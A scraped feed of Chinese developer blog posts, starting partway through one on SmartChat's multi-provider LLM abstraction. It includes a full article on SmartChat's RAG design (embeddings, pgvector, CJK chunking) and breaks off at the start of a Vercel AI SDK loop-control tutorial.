    <span class="hljs-keyword">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Anthropic</span>({ <span class="hljs-attr">apiKey</span>: params.<span class="hljs-property">apiKey</span> });

    <span class="hljs-keyword">return</span> client.<span class="hljs-property">messages</span>.<span class="hljs-title function_">stream</span>({
      <span class="hljs-attr">model</span>: params.<span class="hljs-property">model</span>,
      <span class="hljs-attr">messages</span>: <span class="hljs-title function_">convertToAnthropicFormat</span>(params.<span class="hljs-property">messages</span>),
      <span class="hljs-attr">max_tokens</span>: <span class="hljs-number">4096</span>,
      <span class="hljs-attr">temperature</span>: params.<span class="hljs-property">temperature</span>
    });
  }
}
</code></pre>
<p>上层业务代码只需要调用 <code>streamChat()</code>，完全不关心底层用的是哪个提供商。</p>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20../docs/images/screenshot-04-bot-settings.png" alt="SmartChat 机器人设置转存失败，建议直接上传图片文件" loading="lazy"/></p>
<h2 data-id="heading-4">四、自定义端点：终极灵活性</h2>
<p>SmartChat 还支持用户配置自定义的 OpenAI 兼容端点，这意味着可以接入：</p>
<ul>
<li><strong>本地部署的模型</strong>：Ollama、vLLM、LocalAI</li>
<li><strong>企业私有化部署</strong>：Azure OpenAI、AWS Bedrock（通过兼容层）</li>
<li><strong>任何 OpenAI 兼容的 API</strong>：各种代理、中转服务</li>
</ul>
<p>用户只需在设置页面填入 base URL、API Key 和模型名称即可。</p>
<h2 data-id="heading-5">五、成本优化策略</h2>
<p>多模型架构带来的一个隐藏好处是<strong>成本优化</strong>：</p>
<pre><code class="hljs">简单问题 → 使用便宜的模型（DeepSeek、Qwen-Turbo）
复杂问题 → 使用强力模型（GPT-4o、Claude Sonnet）
嵌入向量 → 使用本地模型（零成本）
</code></pre>
<p>每个机器人可以独立配置模型和参数，运营者可以根据业务场景灵活调整。</p>
<h2 data-id="heading-6">六、这个设计模式的可复用性</h2>
<p>SmartChat 的 Provider 抽象层设计模式可以直接复用到其他 AI 应用中。核心思路总结：</p>
<ol>
<li><strong>识别 SDK 家族</strong>：大多数提供商属于 OpenAI 兼容或 Anthropic 两个家族</li>
<li><strong>预设配置驱动</strong>：用配置而非代码来区分提供商</li>
<li><strong>统一接口</strong>：上层业务只依赖抽象接口</li>
<li><strong>自定义端点兜底</strong>：覆盖所有长尾场景</li>
</ol>
<h2 data-id="heading-7">总结</h2>
<p>LLM 领域变化太快，今天的最优选择明天可能就不是了。SmartChat 的多模型架构不是过度设计，而是对现实的务实应对。如果你也在做 AI 应用，强烈建议从第一天就做好 Provider 抽象。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong>，MIT 开源协议。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析 SmartChat 的 RAG 架构设计 — 如何用 pgvector + 本地嵌入打造企业级智能客服]]></title>    <link>https://juejin.cn/post/7605848213602861102</link>    <guid>https://juejin.cn/post/7605848213602861102</guid>    <pubDate>2026-02-12T17:14:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605848213602861102" data-draft-id="7605769126271434798" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析 SmartChat 的 RAG 架构设计 — 如何用 pgvector + 本地嵌入打造企业级智能客服"/> <meta itemprop="keywords" content="Agent,前端"/> <meta itemprop="datePublished" content="2026-02-12T17:14:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="梦里寻码"/> <meta itemprop="url" content="https://juejin.cn/user/528241507974520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析 SmartChat 的 RAG 架构设计 — 如何用 pgvector + 本地嵌入打造企业级智能客服
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/528241507974520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    梦里寻码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T17:14:45.000Z" title="Thu Feb 12 2026 17:14:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在 LLM 应用落地的过程中，RAG（Retrieval-Augmented Generation）已经成为最主流的知识增强方案。但真正把 RAG 做好并不容易——嵌入模型怎么选？向量数据库用哪个？文档怎么切分？中文场景有哪些坑？</p>
<p>今天通过开源项目 SmartChat 的源码，深入拆解一套生产级 RAG 架构的设计思路。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong></p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/adb37d4883ab40f88cd31a69960fadfe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6YeM5a-756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521624&amp;x-signature=LzHmPRFdhHy7YhOubjJ2aQR3EbM%3D" alt="微信图片_20260212194717_45_236.png" loading="lazy"/></p>
<h2 data-id="heading-1">一、RAG 的核心流程</h2>
<p>RAG 的本质是"先检索，再生成"：</p>
<pre><code class="hljs">用户提问 → Embedding 向量化 → 向量数据库检索 → 取回相关文档片段 → 拼接 Prompt → LLM 生成回答
</code></pre>
<p>SmartChat 的实现完整覆盖了这条链路，并在每个环节做了工程化优化。</p>
<h2 data-id="heading-2">二、双嵌入策略：本地 vs 远程</h2>
<p>SmartChat 最有意思的设计之一是<strong>双嵌入策略</strong>：</p>
<p><strong>本地嵌入（默认）：</strong></p>
<ul>
<li>使用 HuggingFace Transformers 在浏览器/Node 端运行</li>
<li>支持 <code>BGE-small-zh-v1.5</code>（中文场景）和 <code>all-MiniLM-L6-v2</code>（英文场景）</li>
<li>零成本，无需 API Key，数据不出本地</li>
</ul>
<p><strong>远程嵌入（备选）：</strong></p>
<ul>
<li>使用通义千问 <code>text-embedding-v3</code>，512 维向量</li>
<li>适合部署在 Vercel 等无法运行本地模型的环境</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 嵌入模型选择逻辑</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">generateEmbedding</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span>, model: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">if</span> (model === <span class="hljs-string">'local-bge'</span> || model === <span class="hljs-string">'local-minilm'</span>) {
    <span class="hljs-comment">// HuggingFace Transformers 本地推理</span>
    <span class="hljs-keyword">const</span> pipe = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pipeline</span>(<span class="hljs-string">'feature-extraction'</span>, modelName);
    <span class="hljs-keyword">const</span> output = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pipe</span>(text, { <span class="hljs-attr">pooling</span>: <span class="hljs-string">'mean'</span>, <span class="hljs-attr">normalize</span>: <span class="hljs-literal">true</span> });
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(output.<span class="hljs-property">data</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 远程 API 调用</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> openai.<span class="hljs-property">embeddings</span>.<span class="hljs-title function_">create</span>({
      <span class="hljs-attr">model</span>: <span class="hljs-string">'text-embedding-v3'</span>,
      <span class="hljs-attr">input</span>: text,
      <span class="hljs-attr">dimensions</span>: <span class="hljs-number">512</span>
    });
    <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">embedding</span>;
  }
}
</code></pre>
<p>这种设计的好处是：开发阶段用本地模型零成本调试，生产环境可以按需切换到远程模型。</p>
<h2 data-id="heading-3">三、pgvector：为什么不用 Pinecone 或 Milvus？</h2>
<p>SmartChat 选择 Supabase + pgvector 作为向量存储，而不是专用向量数据库，原因很务实：</p>









































<table><thead><tr><th>维度</th><th>pgvector</th><th>Pinecone</th><th>Milvus</th></tr></thead><tbody><tr><td>部署复杂度</td><td>零（Supabase 自带）</td><td>需要额外服务</td><td>需要独立部署</td></tr><tr><td>成本</td><td>Supabase 免费额度内</td><td>按量付费</td><td>自建服务器</td></tr><tr><td>关系查询</td><td>原生 SQL JOIN</td><td>不支持</td><td>不支持</td></tr><tr><td>适用规模</td><td>中小规模（&lt;100万向量）</td><td>大规模</td><td>大规模</td></tr><tr><td>生态整合</td><td>与业务数据同库</td><td>独立系统</td><td>独立系统</td></tr></tbody></table>
<p>对于智能客服场景，知识库通常在几千到几万条文档片段，pgvector 完全够用，而且最大的优势是<strong>向量数据和业务数据在同一个数据库里</strong>，不需要维护额外的基础设施。</p>
<p>SmartChat 使用的向量检索函数：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> match_documents(
  query_embedding vector(<span class="hljs-number">512</span>),
  match_count <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">5</span>,
  filter_bot_id uuid <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>
) <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">TABLE</span> (
  id uuid,
  content text,
  metadata jsonb,
  similarity <span class="hljs-type">float</span>
)
<span class="hljs-keyword">LANGUAGE</span> plpgsql <span class="hljs-keyword">AS</span> $$
<span class="hljs-keyword">BEGIN</span>
  <span class="hljs-keyword">RETURN</span> QUERY
  <span class="hljs-keyword">SELECT</span>
    dc.id,
    dc.content,
    dc.metadata,
    <span class="hljs-number">1</span> <span class="hljs-operator">-</span> (dc.embedding <span class="hljs-operator">&lt;=&gt;</span> query_embedding) <span class="hljs-keyword">as</span> similarity
  <span class="hljs-keyword">FROM</span> document_chunks dc
  <span class="hljs-keyword">WHERE</span> dc.bot_id <span class="hljs-operator">=</span> filter_bot_id
  <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> dc.embedding <span class="hljs-operator">&lt;=&gt;</span> query_embedding
  LIMIT match_count;
<span class="hljs-keyword">END</span>;
$$;
</code></pre>
<p>使用余弦距离 <code>&lt;=&gt;</code> 操作符，配合 IVFFlat 索引加速检索。</p>
<h2 data-id="heading-4">四、CJK 智能分块策略</h2>
<p>文档分块是 RAG 中最容易被忽视但影响巨大的环节。SmartChat 针对中日韩文本做了专门优化：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">splitTextIntoChunks</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span>, chunkSize = <span class="hljs-number">500</span>, overlap = <span class="hljs-number">50</span></span>) {
  <span class="hljs-comment">// 检测是否包含 CJK 字符</span>
  <span class="hljs-keyword">const</span> isCJK = <span class="hljs-regexp">/[\u4e00-\u9fff\u3040-\u309f\u30a0-\u30ff]/</span>.<span class="hljs-title function_">test</span>(text);

  <span class="hljs-keyword">if</span> (isCJK) {
    <span class="hljs-comment">// 中文按字符数分块，优先在句号、问号、感叹号处断开</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">splitBySentenceBoundary</span>(text, chunkSize, overlap);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 英文按 token 数分块，优先在段落和句子边界断开</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">splitByTokenBoundary</span>(text, chunkSize, overlap);
  }
}
</code></pre>
<p>关键设计点：</p>
<ul>
<li><strong>CJK 检测</strong>：自动识别文本语言，选择不同的分块策略</li>
<li><strong>句子边界优先</strong>：避免在句子中间截断，保持语义完整性</li>
<li><strong>重叠窗口</strong>：相邻块之间有 50 字符重叠，防止关键信息被切断</li>
<li><strong>批量插入</strong>：每 10 个块一批写入数据库，避免 payload 过大</li>
</ul>
<h2 data-id="heading-5">五、检索与生成的衔接</h2>
<p>检索到相关文档片段后，SmartChat 将其拼接到 Prompt 中：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> systemPrompt = <span class="hljs-string">`<span class="hljs-subst">${bot.systemPrompt}</span>

以下是从知识库中检索到的相关信息，请基于这些信息回答用户问题：

<span class="hljs-subst">${relevantChunks.map(chunk =&gt; chunk.content).join(<span class="hljs-string">'\n\n'</span>)}</span>

如果以上信息不足以回答问题，请如实告知用户。`</span>;
</code></pre>
<p>同时，对话上下文管理取最近 10 条消息，在保持连贯性和控制 token 消耗之间取得平衡。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aff8d6b1c8c4407abb79acad3490bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6YeM5a-756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521624&amp;x-signature=Sa0V1gRYoKtcgod3fg2eZTTyP2M%3D" alt="微信图片_20260212194801_50_236.png" loading="lazy"/></p>
<h2 data-id="heading-6">总结</h2>
<p>SmartChat 的 RAG 架构虽然不复杂，但每个环节都做了务实的工程选择：本地嵌入降低成本、pgvector 简化架构、CJK 分块保证中文质量、批量写入保证稳定性。这套方案特别适合中小团队快速落地 AI 客服场景。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong>，MIT 开源协议，欢迎 Star 和贡献。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 Vercel AI SDK 使用指南： 循环控制 (Loop Control)]]></title>    <link>https://juejin.cn/post/7605769126271549486</link>    <guid>https://juejin.cn/post/7605769126271549486</guid>    <pubDate>2026-02-13T00:24:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605769126271549486" data-draft-id="7605817795627974706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀  Vercel AI SDK 使用指南： 循环控制 (Loop Control) "/> <meta itemprop="keywords" content="Agent,后端"/> <meta itemprop="datePublished" content="2026-02-13T00:24:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ZaneAI"/> <meta itemprop="url" content="https://juejin.cn/user/186266444380203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀  Vercel AI SDK 使用指南： 循环控制 (Loop Control) 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/186266444380203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ZaneAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T00:24:52.000Z" title="Fri Feb 13 2026 00:24:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在开发复杂的 AI Agent 时，Agent 通常需要经过“思考 -&gt; 调用工具 -&gt; 观察结果 -&gt; 再思考”的多次循环才能完成任务。如何优雅地控制这个循环（例如何时停止、每一步如何动态调整参数）是构建健壮 Agent 的关键。</p>
<p>本文将基于 Vercel AI SDK 的最新特性，带你深入玩转 Agent 的<strong>循环控制 (Loop Control)</strong> 。为了贴合国内开发者的实际场景，本文的所有样例代码均采用<strong>阿里通义千问最新模型 (<code>qwen-max</code>)</strong> 进行演示！</p>
<h2 data-id="heading-0">🛠 环境与模型准备</h2>
<p>通义千问提供了全面兼容 OpenAI 的 API 端点，因此在 Vercel AI SDK 中，我们可以直接使用 <code>@ai-sdk/openai</code> 来无缝接入：</p>
<p>Bash</p>
<pre><code class="hljs language-bash" lang="bash">npm install ai @ai-sdk/openai zod
</code></pre>
<p>在代码中初始化 Qwen 模型实例：</p>
<p>TypeScript</p>
<pre><code class="hljs language-php" lang="php">import { createOpenAI } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/openai'</span>;

<span class="hljs-comment">// 配置阿里百炼 (DashScope) 的兼容端点</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">qwen</span> = <span class="hljs-title function_ invoke__">createOpenAI</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1'</span>,
  <span class="hljs-attr">apiKey</span>: process.env.DASHSCOPE_API_KEY, 
});

<span class="hljs-comment">// 在后续的示例中，我们将统一使用 qwen('qwen-max')</span>
</code></pre>
<hr/>
<h2 data-id="heading-1">一、 核心概念：什么是 Loop Control？</h2>
<p>在使用 <code>ToolLoopAgent</code> 编排 Agent 时，循环会持续进行，直到满足以下任一条件才会停止：</p>
<ol>
<li>模型返回了除 <code>tool-calls</code>（工具调用）之外的完成原因。</li>
<li>调用的工具<strong>没有</strong>配备 <code>execute</code>（执行）函数。</li>
<li>工具调用触发了需要人工审批的拦截。</li>
<li><strong>满足了开发者定义的停止条件 (Stop Condition)</strong> 。</li>
</ol>
<p>Vercel AI SDK 提供了两个极其强大的参数来控制这个内部循环：</p>
<ul>
